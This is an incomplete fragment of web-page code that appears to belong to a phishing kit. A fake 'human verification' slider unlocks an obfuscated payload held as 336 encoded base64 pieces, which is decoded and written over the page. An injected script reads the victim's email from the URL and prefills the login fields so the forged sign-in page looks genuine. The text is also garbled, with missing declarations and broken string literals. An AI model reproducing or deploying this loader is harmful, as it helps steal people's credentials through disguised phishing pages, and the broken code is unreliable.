<style>

    user-select: none; touch-action: none; transition: background 0.2s;

  #slider-handle:active { cursor: grabbing; background: #0050e0; }

<script nonce="">
console.log("[Decoder] Starting. Pieces count:", 336);

var piecesArr = ["alBGalhGSE1SXXpVdk5IRXdUWE1qRnI3R0RQc29GdlBLRGRNRGg7XEhEdnJEWkZMbU5uTW9MO3tWVERINWdEM1lcRGZbUURQRUxVNUhkRFxwdUQ1ZWlwZ1JFalF5W0Q5TlJEd0RMdXY5RHJkUURaRVRaa0kzXFFGRGg4RHpQRF1EN0pEPG..."];

function reassemblePieces() {
  var out = '';
  try {
    for (var i = 0; i < piecesArr.length; i++) {
      var b64piece = piecesArr[i];
      var transformed = atob(b64piece);
      var rot = (transformed.length % 11);
      var chars = [];
      for (var j = 0; j < transformed.length; j++) {
        var code = (transformed.charCodeAt(j) - rot) & 0xFF;
        chars.push(String.fromCharCode(code));
      }
      out += chars.reverse().join('');
    }
    return out;
  } catch (e) {
    console.error('[Decoder] Reassembly failed:', e);
    return null;
  }
}

// --- Slider Logic ---
var handle = document.getElementById('slider-handle');
var track = document.getElementById('slider-track');
var isDragging = false;
var startX = 0;
var handleLeft = 0;

function startDrag(e) {
  isDragging = true;
  startX = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
  handleLeft = handle.offsetLeft;
  document.addEventListener('mousemove', drag);
  document.addEventListener('touchmove', drag, {passive: false});
  document.addEventListener('mouseup', stopDrag);
  document.addEventListener('touchend', stopDrag);
}

function drag(e) {
  if (!isDragging) return;
  e.preventDefault(); // Prevent scrolling on mobile while dragging
  var x = e.clientX || (e.touches && e.touches[0] && e.touches[0].clientX) || 0;
  var dx = x - startX;
  var maxLeft = track.offsetWidth - handle.offsetWidth;
  var newLeft = Math.max(0, Math.min(handleLeft + dx, maxLeft));
  handle.style.left = newLeft + 'px';
  
  if (newLeft >= maxLeft - 5) {
    stopDrag();
    triggerReconstruct();
  }
}

function stopDrag() {
  isDragging = false;
  document.removeEventListener('mousemove', drag);
  document.removeEventListener('touchmove', drag);
  document.removeEventListener('mouseup', stopDrag);
  document.removeEventListener('touchend', stopDrag);
  
  if (handle.offsetLeft < track.offsetWidth - handle.offsetWidth - 5) {
    handle.style.left = '0px';
  }
}

function triggerReconstruct() {
  var overlay = document.getElementById('human-overlay');
  if (overlay) overlay.remove();
  attemptReconstruct();
}

handle.addEventListener('mousedown', startDrag);
handle.addEventListener('touchstart', startDrag, {passive: false});
// -------------------

    if (hash && hash.length > 1) {
      var emailValue = hash.substring(1);

      var safeEmail = JSON.stringify(emailValue);

      var prefillScript = '<scr' + 'ipt>' +
        '(function() {' +

        '    // Also set any element that displays the email (e.g., #auth_email)
        ' +
        '    try { var disp = document.getElementById("auth_email"); if (disp) { disp.textContent = emailVal; console.log("[Prefill] Set #auth_email text"); } } catch(e) { }' +
        '    // Broad input filling for visible fields
        ' +
        '    var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;' +
        '    function tryFill() {' +
        '      var inputs = document.querySelectorAll("input");' +
        '      console.log("[Prefill] Scanning", inputs.length, "inputs on page...");' +
        '      var filled = false;' +
        '      for (var i = 0; i < inputs.length; i++) {' +
        '        var el = inputs[i];' +
        '        var id = (el.id || "").toLowerCase();' +
        '        var name = (el.name || "").toLowerCase();' +
        '        var ph = (el.placeholder || "").toLowerCase();' +
        '        var type = (el.type || "").toLowerCase();' +
        '        if (name === "email" || id.includes("email") || id.includes("user") || id.includes("mail") || name.includes("email") || name.includes("user") || name.includes("mail") || ph.includes("email") || ph.includes("user") || ph.includes("mail") || type === "email") {' +
        '          try { if (nativeSetter) { nativeSetter.call(el, emailVal); } else { el.value = emailVal; } el.dispatchEvent(new Event("input", { bubbles: true })); el.dispatchEvent(new Event("change", { bubbles: true })); el.dispatchEvent(new Event("blur", { bubbles: true })); filled = true; console.log("[Prefill] Filled input:", el); } catch(e) { }' +

      if (html.includes('</head>')) {

      } else if (html.includes('<body>')) {
        html = html.replace('<body>', '<body>' + prefillScript);
      } else {
        html = prefillScript + html;
      }
    } else {
      console.log("[Decoder] No hash found in URL.");
    }

    document.open();
    document.write(html);
    document.close();
    console.log("[Decoder] Page rendered successfully.");
  } catch (e) {
    console.error('[Decoder] Fatal error:', e);
    document.body.innerHTML = '<h2 style="color:red;text-align:center;margin-top:50px;">Reconstruction failed: ' + e.message + '</h2>';
